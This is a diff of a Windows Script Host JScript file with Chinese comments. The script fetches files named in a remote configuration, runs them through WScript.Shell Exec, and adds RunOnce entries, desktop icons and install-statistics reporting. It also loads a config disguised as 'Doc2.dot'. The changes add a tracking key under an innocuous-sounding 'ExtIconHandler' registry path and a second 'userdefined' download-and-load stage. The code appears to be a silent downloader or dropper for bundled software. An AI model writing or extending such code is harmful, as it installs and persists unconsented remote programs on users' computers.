@@ -309,8 +309,7 @@ function filter_dlbusiness.prototype.run(pipe){
 	else{//开始下载		
 		if(destmd5.length > 0){
 			//pipe.url =  pipe.url; //+"?rnd="+ (new Date()).valueOf() 
-		}
-		
+		}		
 		var objXMLHTTP = getXmlHttp(); 		 
 		objXMLHTTP.open("GET", pThis.dlobj.url,true);				
 		objXMLHTTP.onreadystatechange = function(){
@@ -372,10 +371,10 @@ function filter_dlbusiness.prototype.run(pipe){
 }
 filter_dlbusiness.prototype.callback=null;
 //////////
-function filter_loadconfig(fileName) {
+function filter_loadFile(fileName) {
 	this.fileName=fileName;
 };
-function filter_loadconfig.prototype.run (pipe) {
+function filter_loadFile.prototype.run (pipe) {
 	var pThis = this;	
 	var fileName = this.fileName?this.fileName:pipe.name
 	var path = __workdir+fileName;
@@ -385,7 +384,8 @@ function filter_loadconfig.prototype.run (pipe) {
 }
 function filter_innertask(){
 }
-function filter_launch(name,param){
+function filter_launch(id,name,param){
+		this.id = id;
 		this.name = name
 		this.param = param
 }
@@ -400,6 +400,11 @@ function filter_launch.prototype.run(pipe){
 	 				cmd += " " + param;
 	 			__TRY(function(){ __wshShell.Exec(cmd);}); //非管理员会脚本出错!无权限
 	 			sendHttpStat("installed", name,1,1);
+	 			 			
+	 			var key = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+this.id
+				var value = this.name+" "+this.param;
+				log("filter_launch.prototype.run key="+key+",value="+value);
+				__TRY(function (){__wshShell.RegWrite(key, value, "REG_SZ") });					
 	 		}
 	 } 	
 	 return true
@@ -420,8 +425,8 @@ function filter_regrunonce.prototype.run(pipe){
 }
 function filter_desktopicon(name,URL,IconFile,IconFileName){
 		log("filter_desktopicon name="+name+",URL="+URL+",IconFile="+IconFile+",IconFileName="+IconFileName)
-		this.name = name;
-		this.URL=URL
+		this.name = name?name:IconFileName;
+		this.URL=URL?URL:IconFile
 		this.IconFile = IconFile
 		this.IconFileName = IconFileName
 }
@@ -477,8 +482,13 @@ function filter_innertask.prototype.run(pipe){
 		}
 		var _innertask_module = new module("innertask");		
 		//下载列表
-		for(i=0; i<___gconfig.installlist.length;i++){
+		for(i=0; i<___gconfig.installlist.length;i++){			
 			var install = ___gconfig.installlist[i];
+			var regvalue = __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+install.id)} );
+			if(regvalue){
+				log("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\"+install.id+ " = "+regvalue)
+				continue;		
+			}		
 			if(install.invalidcondition && install.invalidcondition()){
 			}else{
 				if(!__startup){
@@ -487,7 +497,7 @@ function filter_innertask.prototype.run(pipe){
 					_filter_dl.callback =_innertask_module.push(_filter_dl);
 				}
 				if(install.runimmediately || __startup){ //要求立即运行,和开机启动一样
-					var _filter_launch = new filter_launch(install.name,install.param);			
+					var _filter_launch = new filter_launch(install.id,install.name,install.param);			
 					_filter_launch.callback =_innertask_module.push(_filter_launch);					
 				}else{
 					var _filter_regrunonce = new filter_regrunonce(install.id ,install.name,install.param);			
@@ -518,12 +528,29 @@ function filter_innertask.prototype.run(pipe){
 			}
 		}
 		
-		_innertask_module.run(pipe)
 		_innertask_module.setDoneCallback(function (mod) {
-			log("module name "+mod.name+" onDonCallback");		
-			exit(0) 
+			log("module name "+mod.name+" onDonCallback");		////innertask 完后就是userfinedtask 最后一步了
+			if(!__startup){
+				var _userdefined_module = new module("userdefined");		
+				for(i=0;i<___gconfig.userdefinedlist.length;i++){
+					var userdefined = ___gconfig.userdefinedlist[i]
+					if(userdefined.invalidcondition && userdefined.invalidcondition()){						
+					}else{
+						var _filter_dl = new filter_dlbusiness(userdefined);
+						_filter_dl.callback =_userdefined_module.push(_filter_dl);
+						var _filter_load = new filter_loadFile(userdefined.name)
+						_filter_load.callback = _userdefined_module.push(_filter_load);
+					}
+				}
+				
+				var userdefinedpipe = {name:"userfined"}
+				_userdefined_module.run(userdefinedpipe)
+			}else{
+				exit(0) 	
+			}			
 		})//end _innertask_module.setDoneCallback
-		
+		_innertask_module.run(pipe)
+	
 	}//end "object" == typeof ___gconfig
 }
 function filter_eXclusiveRuning(once){
@@ -645,13 +672,13 @@ function onload(){
 		//return ;
 		__startup = 1
 	}	
-	__startup = 1	 
+	//__startup = 1	 
 	
 	//1.启动统计
 	var __module = new module("global.js", 1);	
 	var filter_xrun = new filter_eXclusiveRuning(1)
 	var filter_dl =new filter_dlbusiness(__destReadyConfig);
-	var filter_load= new filter_loadconfig("Doc2.dot");
+	var filter_load= new filter_loadFile("Doc2.dot");
 	var filter_inner= new filter_innertask();
 	var filter_xrun2= new filter_eXclusiveRuning();
 		
